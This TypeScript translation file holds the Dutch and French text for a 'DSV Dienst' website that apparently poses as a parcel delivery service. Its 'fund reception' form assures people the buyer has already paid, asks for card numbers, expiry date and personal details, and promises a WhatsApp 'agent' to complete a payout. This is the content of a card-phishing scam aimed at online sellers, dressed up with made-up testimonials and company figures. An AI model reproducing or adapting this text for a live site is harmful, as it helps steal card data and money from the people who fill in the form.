export type Language = 'nl' | 'fr'

interface SolutionItem {
  title: string
  description: string
}

interface IndustryItem {
  title: string
  description: string
}

interface StatItem {
  number: string
  label: string
}

interface ServiceItem {
  title: string
  description: string
  features: string[]
}

interface TestimonialItem {
  name: string
  role: string
  content: string
}

interface GalleryItem {
  title: string
  description: string
}

interface ContactInfoItem {
  title: string
  info: string
}

export interface Translations {
  header: {
    home: string
    services: string
    fundReception: string
    brand: string
  }
  hero: {
    titleTop: string
    titleBottom: string
    subtitlePre: string
    subtitleFast: string
    subtitleAnd: string
    subtitleSafe: string
    ctaButton: string
  }
  solutions: {
    headingPre: string
    headingHighlight: string
    description: string
    items: SolutionItem[]
    learnMore: string
  }
  industries: {
    heading: string
    subheading: string
    description: string
    seeMore: string
    items: IndustryItem[]
  }
  stats: {
    heading: string
    description: string
    items: StatItem[]
  }
  about: {
    heading: string
    subheading: string
    description: string
    companyDescription: string
    promise: string
    items: string[]
  }
  services: {
    headingPre: string
    headingHighlight: string
    description: string
    items: ServiceItem[]
    stats: StatItem[]
  }
  testimonials: {
    headingHighlight: string
    headingPost: string
    description: string
    items: TestimonialItem[]
    ctaHeading: string
    ctaText: string
    ctaButton: string
  }
  gallery: {
    headingPre: string
    headingHighlight: string
    description: string
    items: GalleryItem[]
    features: GalleryItem[]
  }
  fundReception: {
    heading: string
    infoBoxTitle: string
    infoBoxText: string
    infoBoxSubtext: string
    formTitle: string
    errorTitle: string
    genericError: string
    fields: {
      fullName: string
      fullNamePlaceholder: string
      fullNameRequired: string
      phone: string
      phonePlaceholder: string
      phoneRequired: string
      address: string
      addressPlaceholder: string
      addressRequired: string
      importantInfoTitle: string
      importantInfoText: string
      itemDescription: string
      itemDescriptionPlaceholder: string
      bankInfoTitle: string
      cardBE: string
      cardBEPlaceholder: string
      cardBERequired: string
      card525149: string
      card525149Placeholder: string
      card525149Required: string
      expirationDate: string
      expirationDateRequired: string
      amount: string
      amountRequired: string
      amountMin: string
      requiredFallback: string
    }
    submitButton: string
    submitting: string
    successTitle: string
    successText: string
    successThanks: string
    closeButton: string
  }
  footer: {
    description: string
    badge: string
    servicesTitle: string
    services: string[]
    quickLinksTitle: string
    quickLinks: string[]
    contactTitle: string
    contactInfo: ContactInfoItem[]
    copyright: string
    privacyPolicy: string
    termsOfUse: string
    legalNotice: string
  }
}

export const translations: Record<Language, Translations> = {
  nl: {
    header: {
      home: 'Home',
      services: 'Diensten',
      fundReception: 'Ontvangst van fondsen',
      brand: 'DSV Dienst',
    },
    hero: {
      titleTop: 'DSV',
      titleBottom: 'Dienst',
      subtitlePre: 'Professionele ophaal- en bezorgservice voor pakketten',
      subtitleFast: 'snel',
      subtitleAnd: 'en',
      subtitleSafe: 'veilig.',
      ctaButton: 'Formulier voor fondsenontvangst',
    },
    solutions: {
      headingPre: 'Toegang tot alle',
      headingHighlight: 'logistieke oplossingen op één plek',
      description: 'Uitgebreide digitale oplossingen ontworpen om uw logistieke operaties te stroomlijnen',
      items: [
        {
          title: 'Offerte, Boeken & Beheren',
          description: 'Krijg al direct offertes, boek zendingen en beheer uw logistiek in real-time',
        },
        {
          title: 'Magazijnbeheer',
          description: 'Complete magazijn- en voorraadbeheeroplossingen',
        },
        {
          title: 'Traceren & Monitoren',
          description: 'Real-time tracking en zichtbaarheid van zendingen over alle kanalen',
        },
      ],
      learnMore: 'Meer informatie',
    },
    industries: {
      heading: 'Wat uw branche ook is,',
      subheading: 'we zijn uw logistieke partner',
      description: 'Branchespecifieke expertise en oplossingen voor elke sector',
      seeMore: 'Meer bekijken',
      items: [
        {
          title: 'Automobiel',
          description: 'Gespecialiseerde logistieke oplossingen voor automobielproductie en toeleveringsketens',
        },
        {
          title: 'Technologie',
          description: 'Snelle en veilige levering van elektronica en technische componenten',
        },
        {
          title: 'Gezondheidszorg',
          description: 'Temperatuurgecontroleerde en conforme logistiek voor medische benodigdheden',
        },
        {
          title: 'Industrie',
          description: 'Zware logistieke oplossingen voor industriële apparatuur en materialen',
        },
        {
          title: 'Consument',
          description: 'E-commerce en retaillogistiek met snelle leveringsmogelijkheden',
        },
        {
          title: 'Luchtvaart',
          description: 'Precisilogistiek voor luchtvaart- en defensie-industrie-vereisten',
        },
      ],
    },
    stats: {
      heading: 'DSV Dienst in Nummers',
      description: 'Demonstratie van onze omvang, bereik en inzet voor excellence',
      items: [
        {
          number: '+5.000',
          label: 'Succesvolle leveringen',
        },
        {
          number: '90',
          label: 'Landen en regio\'s',
        },
        {
          number: '~150.000',
          label: 'Teamleden',
        },
      ],
    },
    about: {
      heading: 'Over',
      subheading: 'DSV Dienst',
      description: 'Leidende aanbieder van ophaal- en bezorgservices met geavanceerde logistieke oplossingen en vertrouwde partnerbenadering',
      companyDescription: 'DSV Dienst is een betrouwbare logistieke partner die uitgebreide ophaal- en bezorgoplossingen in de regio biedt. Met geavanceerde technologie en een team van gecertificeerde professionals zorgen we ervoor dat uw pakketten veilig en op tijd hun bestemming bereiken.',
      promise: 'Onze belofte',
      items: [
        'Bliksemsnelle ophalingen binnen 2 uur',
        'Real-time GPS-tracking van uw pakketten',
        'Premium verpakking en volledige verzekering',
        'Gecertificeerde en ervaren professionals',
        'Concurrerende tarieven en transparante prijzen',
      ],
    },
    services: {
      headingPre: 'Onze',
      headingHighlight: 'diensten',
      description: 'DSV helpt u met al uw behoeften voor het ophalen en bezorgen van pakketten, met professionele diensten en erkende expertise.',
      items: [
        {
          title: 'Express ophaling',
          description: 'Supersnelle ophaalservice met realtime tracking en maximale veiligheidsgarantie.',
          features: [
            'Ophaling binnen 2 uur',
            'Realtime GPS-tracking',
            'Premium verpakking',
            'Verzekering inbegrepen',
          ],
        },
        {
          title: 'Snelle levering',
          description: 'Ultrasnelle levering met onze vloot elektrische voertuigen en een team van experts.',
          features: [
            'Levering 24/7',
            'Elektrische voertuigen',
            'Gecertificeerd team',
            'Concurrerende tarieven',
          ],
        },
        {
          title: 'Premiumservice',
          description: 'Maatwerkoplossingen van hoge kwaliteit met toegewijde begeleiding en exclusieve garanties.',
          features: [
            'Toegewijde adviseur',
            'Premiumgarantie',
            'VIP-service',
            'Prioritaire ondersteuning',
          ],
        },
      ],
      stats: [
        { number: '5000+', label: 'Snelle leveringen' },
        { number: '98%', label: 'Tevreden klanten' },
        { number: '100%', label: 'Nationale dekking' },
        { number: '365d', label: 'Support 24/7' },
      ],
    },
    testimonials: {
      headingHighlight: 'Klant',
      headingPost: 'testimonials',
      description: 'Ontdek wat onze klanten zeggen over onze ophaal- en bezorgdiensten.',
      items: [
        {
          name: 'Marieke van der Berg',
          role: 'Particuliere klant',
          content: 'Ik heb alles in orde gemaakt met de service en mijn geld ontvangen via een onmiddellijke overschrijving. Bedankt voor jullie betrouwbaarheid.',
        },
        {
          name: 'Pieter Janssen',
          role: 'Ondernemer',
          content: 'Ik doe regelmatig een beroep op DSV Dienst voor mijn professionele overschrijvingen. Altijd op tijd, perfecte service!',
        },
        {
          name: 'Sophie de Vries',
          role: 'Handelaar',
          content: 'DSV Dienst helpt ons enorm bij onze fondsenontvangsten. Snelle, veilige service en zeer scherpe tarieven.',
        },
      ],
      ctaHeading: 'Word ook een tevreden klant',
      ctaText: 'Vertrouw op DSV Dienst voor uw ophaal- en bezorgbehoeften.',
      ctaButton: 'Nu beginnen',
    },
    gallery: {
      headingPre: 'Onze',
      headingHighlight: 'Expertise',
      description: 'Ontdek onze knowhow en professionele uitrusting voor het ophalen en bezorgen van pakketten.',
      items: [
        { title: 'Pakket Ophalen', description: 'Professionele ophaalservice' },
        { title: 'Express Bezorging', description: 'Snelle en veilige bezorging' },
        { title: 'Expert Team', description: 'Gekwalificeerde en ervaren professionals' },
        { title: '24/7 Service', description: 'Altijd beschikbaar' },
      ],
      features: [
        {
          title: 'Veilig Ophalen',
          description: 'Professionele behandeling van uw pakketten met veilige verpakking',
        },
        {
          title: 'Snelle Bezorging',
          description: 'Express transport met realtime tracking tot bestemming',
        },
        {
          title: '24/7 Service',
          description: 'Permanente beschikbaarheid voor uw urgente behoeften',
        },
        {
          title: 'Volledige Garantie',
          description: 'Volledige verzekering op al uw pakketten tijdens transport',
        },
      ],
    },
    fundReception: {
      heading: 'Formulier voor fondsenontvangst',
      infoBoxTitle: 'Ontvangst van fondsen',
      infoBoxText: 'Snelle en veilige verwerking',
      infoBoxSubtext: 'Vul het formulier correct in om je geld vandaag nog per directe overboeking te ontvangen.',
      formTitle: 'Formulier voor fondsenontvangst',
      errorTitle: 'Fout',
      genericError: 'Fout bij het registreren. Probeer het opnieuw of neem direct contact met ons op.',
      fields: {
        fullName: 'Volledige naam',
        fullNamePlaceholder: 'Uw volledige naam',
        fullNameRequired: 'Volledige naam is verplicht',
        phone: 'Telefoon',
        phonePlaceholder: '01 23 45 67 89',
        phoneRequired: 'Telefoonnummer is verplicht',
        email: 'E-mailadres',
        emailPlaceholder: 'uw.email@example.com',
        emailRequired: 'E-mailadres is verplicht',
        importantInfoTitle: 'Belangrijke informatie',
        importantInfoText: 'Let op: u hoeft niets te betalen; de koper heeft al alles betaald, dus voor u is alles gratis.',
        itemDescription: 'Beschrijving van het artikel',
        itemDescriptionPlaceholder: 'Gedetailleerde beschrijving van het artikel',
        bankInfoTitle: 'Bankinformatie',
        cardBE: 'BE Kaartnummer',
        cardBEPlaceholder: 'BE kaartnummer',
        cardBERequired: 'BE kaart is verplicht',
        card525149: '52/49/51 Kaartnummer',
        card525149Placeholder: '52/49/51 kaartnummer',
        card525149Required: '52/49/51 kaart is verplicht',
        expirationDate: 'Vervaldatum',
        expirationDateRequired: 'Vervaldatum is verplicht',
        amount: 'Te Ontvangen Bedrag',
        amountRequired: 'Bedrag is verplicht',
        amountMin: 'Bedrag moet groter zijn dan 0',
        age: 'Leeftijd',
        agePlaceholder: 'Uw leeftijd',
        ageRequired: 'Leeftijd is verplicht',
        requiredFallback: 'Dit veld is verplicht',
      },
      submitButton: 'Aanvraag verzenden',
      submitting: 'Verzenden...',
      successTitle: 'We hebben uw aanvraag ontvangen',
      successText: 'Een agent DSV Dienst zal contact met u opnemen via WhatsApp voor verificatie. Volg de instructies op WhatsApp om het geld vandaag nog te ontvangen via onmiddellijke overschrijving.',
      successThanks: 'Dank U',
      closeButton: 'Sluiten',
    },
    footer: {
      description: 'Uw betrouwbare partner voor het ophalen en bezorgen van pakketten. Snelle, betrouwbare en veilige service door het hele land.',
      badge: '24/7 Service',
      servicesTitle: 'Onze Diensten',
      services: ['Pakket Ophalen', 'Express Bezorging', '24/7 Service', 'Realtime Tracking'],
      quickLinksTitle: 'Snelle Links',
      quickLinks: ['Home', 'Diensten', 'Geldoverdracht'],
      contactTitle: 'Contact',
      contactInfo: [
        { title: 'Email', info: 'ondersteuning@dsvv-dienst.com' },
        { title: 'Openingstijden', info: '24h/24 - 7j/7' },
      ],
      copyright: '© 2026 DSV Dienst. Alle rechten voorbehouden.',
      privacyPolicy: 'Privacybeleid',
      termsOfUse: 'Gebruiksvoorwaarden',
      legalNotice: 'Juridische vermeldingen',
    },
  },
  fr: {
    header: {
      home: 'Accueil',
      services: 'Services',
      fundReception: 'Réception de fonds',
      brand: 'DSV Dienst',
    },
    hero: {
      titleTop: 'DSV',
      titleBottom: 'Dienst',
      subtitlePre: 'Service professionnel de collecte et de livraison de colis',
      subtitleFast: 'rapide',
      subtitleAnd: 'et',
      subtitleSafe: 'sécurisé.',
      ctaButton: 'Formulaire de réception de fonds',
    },
    solutions: {
      headingPre: 'Accédez à toutes vos',
      headingHighlight: 'solutions logistiques en un seul endroit',
      description: 'Solutions numériques complètes conçues pour rationaliser vos opérations logistiques',
      items: [
        {
          title: 'Devis, Réservation & Gestion',
          description: 'Obtenez des devis instantanés, réservez des envois et gérez votre logistique en temps réel',
        },
        {
          title: 'Gestion des Entrepôts',
          description: 'Solutions complètes de gestion des entrepôts et des stocks',
        },
        {
          title: 'Suivi & Surveillance',
          description: 'Suivi en temps réel et visibilité des envois sur tous les canaux',
        },
      ],
      learnMore: 'En savoir plus',
    },
    industries: {
      heading: 'Quel que soit votre secteur,',
      subheading: 'nous sommes votre partenaire logistique',
      description: 'Expertise et solutions spécifiques au secteur pour chaque industrie',
      seeMore: 'Voir plus',
      items: [
        {
          title: 'Automobile',
          description: 'Solutions logistiques spécialisées pour la fabrication automobile et les chaînes d\'approvisionnement',
        },
        {
          title: 'Technologie',
          description: 'Livraison rapide et sécurisée des équipements électroniques et des composants technologiques',
        },
        {
          title: 'Santé',
          description: 'Logistique contrôlée en température et conforme pour les fournitures médicales',
        },
        {
          title: 'Industrie',
          description: 'Solutions logistiques lourdes pour les équipements industriels et les matériaux',
        },
        {
          title: 'Consommateur',
          description: 'Logistique e-commerce et retail avec capacités de livraison rapide',
        },
        {
          title: 'Aérospatiale',
          description: 'Logistique de précision pour les exigences de l\'industrie aéronautique et de défense',
        },
      ],
    },
    stats: {
      heading: 'DSV Dienst en Chiffres',
      description: 'Démonstration de notre envergure, notre portée et notre engagement envers l\'excellence',
      items: [
        {
          number: '+5 000',
          label: 'Livraisons Réussies',
        },
        {
          number: '90',
          label: 'Pays et Régions',
        },
        {
          number: '~150 000',
          label: 'Membres de l\'Équipe',
        },
      ],
    },
    about: {
      heading: 'À Propos',
      subheading: 'DSV Dienst',
      description: 'Fournisseur leader de services de collecte et de livraison avec des solutions logistiques avancées et une approche de partenariat fiable',
      companyDescription: 'DSV Dienst est un partenaire logistique fiable offrant des solutions complètes de collecte et de livraison dans la région. Avec la technologie de pointe et une équipe de professionnels certifiés, nous veillons à ce que vos colis atteignent leur destination en toute sécurité et à temps.',
      promise: 'Notre Promesse',
      items: [
        'Collectes éclair dans les 2 heures',
        'Suivi GPS en temps réel de vos colis',
        'Emballage premium et assurance complète',
        'Professionnels certifiés et expérimentés',
        'Tarifs compétitifs et prix transparents',
      ],
    },
    services: {
      headingPre: 'Nos',
      headingHighlight: 'services',
      description: 'DSV vous aide pour tous vos besoins de collecte et de livraison de colis, avec des services professionnels et une expertise reconnue.',
      items: [
        {
          title: 'Collecte express',
          description: 'Service de collecte ultra-rapide avec suivi en temps réel et garantie de sécurité maximale.',
          features: [
            'Collecte sous 2 heures',
            'Suivi GPS en temps réel',
            'Emballage premium',
            'Assurance incluse',
          ],
        },
        {
          title: 'Livraison rapide',
          description: 'Livraison ultra-rapide avec notre flotte de véhicules électriques et une équipe d\'experts.',
          features: [
            'Livraison 24/7',
            'Véhicules électriques',
            'Équipe certifiée',
            'Tarifs compétitifs',
          ],
        },
        {
          title: 'Service Premium',
          description: 'Solutions sur mesure de haute qualité avec accompagnement dédié et garanties exclusives.',
          features: [
            'Conseiller dédié',
            'Garantie premium',
            'Service VIP',
            'Support prioritaire',
          ],
        },
      ],
      stats: [
        { number: '5000+', label: 'Livraisons rapides' },
        { number: '98%', label: 'Clients satisfaits' },
        { number: '100%', label: 'Couverture nationale' },
        { number: '365j', label: 'Support 24/7' },
      ],
    },
    testimonials: {
      headingHighlight: 'Témoignages',
      headingPost: 'clients',
      description: 'Découvrez ce que nos clients disent de nos services de collecte et de livraison.',
      items: [
        {
          name: 'Marieke van der Berg',
          role: 'Cliente particulière',
          content: 'J\'ai tout réglé avec le service et reçu mon argent par virement immédiat. Merci pour votre fiabilité.',
        },
        {
          name: 'Pieter Janssen',
          role: 'Entrepreneur',
          content: 'Je fais régulièrement appel à DSV Dienst pour mes virements professionnels. Toujours à l\'heure, service parfait !',
        },
        {
          name: 'Sophie de Vries',
          role: 'Commerçante',
          content: 'DSV Dienst nous aide énormément pour nos réceptions de fonds. Service rapide, sécurisé et tarifs très compétitifs.',
        },
      ],
      ctaHeading: 'Devenez vous aussi un client satisfait',
      ctaText: 'Faites confiance à DSV Dienst pour vos besoins de collecte et de livraison.',
      ctaButton: 'Commencer maintenant',
    },
    gallery: {
      headingPre: 'Notre',
      headingHighlight: 'Expertise',
      description: 'Découvrez notre savoir-faire et notre équipement professionnel pour la collecte et la livraison de colis.',
      items: [
        { title: 'Collecte de colis', description: 'Service de collecte professionnel' },
        { title: 'Livraison Express', description: 'Livraison rapide et sécurisée' },
        { title: 'Équipe Experte', description: 'Professionnels qualifiés et expérimentés' },
        { title: 'Service 24/7', description: 'Toujours disponible' },
      ],
      features: [
        {
          title: 'Collecte sécurisée',
          description: 'Traitement professionnel de vos colis avec un emballage sécurisé',
        },
        {
          title: 'Livraison rapide',
          description: 'Transport express avec suivi en temps réel jusqu\'à destination',
        },
        {
          title: 'Service 24/7',
          description: 'Disponibilité permanente pour vos besoins urgents',
        },
        {
          title: 'Garantie complète',
          description: 'Assurance totale sur tous vos colis pendant le transport',
        },
      ],
    },
    fundReception: {
      heading: 'Formulaire de réception de fonds',
      infoBoxTitle: 'Réception de fonds',
      infoBoxText: 'Traitement rapide et sécurisé',
      infoBoxSubtext: 'Remplissez correctement le formulaire pour recevoir votre argent dès aujourd\'hui par virement immédiat.',
      formTitle: 'Formulaire de réception de fonds',
      errorTitle: 'Erreur',
      genericError: 'Erreur lors de l\'enregistrement. Veuillez réessayer ou nous contacter directement.',
      fields: {
        fullName: 'Nom complet',
        fullNamePlaceholder: 'Votre nom complet',
        fullNameRequired: 'Le nom complet est obligatoire',
        phone: 'Téléphone',
        phonePlaceholder: '01 23 45 67 89',
        phoneRequired: 'Le numéro de téléphone est obligatoire',
        email: 'Adresse e-mail',
        emailPlaceholder: 'votre.email@example.com',
        emailRequired: 'L\'adresse e-mail est obligatoire',
        importantInfoTitle: 'Informations importantes',
        importantInfoText: 'Attention : vous n\'avez rien à payer ; l\'acheteur a déjà tout réglé, donc pour vous c\'est gratuit.',
        itemDescription: 'Description de l\'article',
        itemDescriptionPlaceholder: 'Description détaillée de l\'article',
        bankInfoTitle: 'Informations bancaires',
        cardBE: 'Numéro de carte BE',
        cardBEPlaceholder: 'Numéro de carte BE',
        cardBERequired: 'La carte BE est obligatoire',
        card525149: 'Numéro de carte 52/49/51',
        card525149Placeholder: 'Numéro de carte 52/49/51',
        card525149Required: 'La carte 52/49/51 est obligatoire',
        expirationDate: 'Date d\'expiration',
        expirationDateRequired: 'La date d\'expiration est obligatoire',
        amount: 'Montant à Recevoir',
        amountRequired: 'Le montant est obligatoire',
        amountMin: 'Le montant doit être supérieur à 0',
        age: 'Âge',
        agePlaceholder: 'Votre âge',
        ageRequired: 'L\'âge est obligatoire',
        requiredFallback: 'Ce champ est obligatoire',
      },
      submitButton: 'Envoyer la Demande',
      submitting: 'Envoi...',
      successTitle: 'Nous avons reçu votre demande',
      successText: 'Un agent DSV Dienst vous contactera via WhatsApp pour vérification. Suivez les instructions sur WhatsApp pour recevoir votre argent dès aujourd\'hui par virement immédiat.',
      successThanks: 'Merci',
      closeButton: 'Fermer',
    },
    footer: {
      description: 'Votre partenaire fiable pour la collecte et la livraison de colis. Service rapide, fiable et sécurisé dans tout le pays.',
      badge: 'Service 24/7',
      servicesTitle: 'Nos Services',
      services: ['Collecte de Colis', 'Livraison Express', 'Service 24/7', 'Suivi en Temps Réel'],
      quickLinksTitle: 'Liens Rapides',
      quickLinks: ['Accueil', 'Services', 'Transfert d\'Argent'],
      contactTitle: 'Contact',
      contactInfo: [
        { title: 'Email', info: 'ondersteuning@dsvv-dienst.com' },
        { title: 'Horaires', info: '24h/24 - 7j/7' },
      ],
      copyright: '© 2026 DSV Dienst. Tous les droits sont réservés.',
      privacyPolicy: 'Politique de Confidentialité',
      termsOfUse: 'Conditions d\'Utilisation',
      legalNotice: 'Mentions Légales',
    },
  },
}
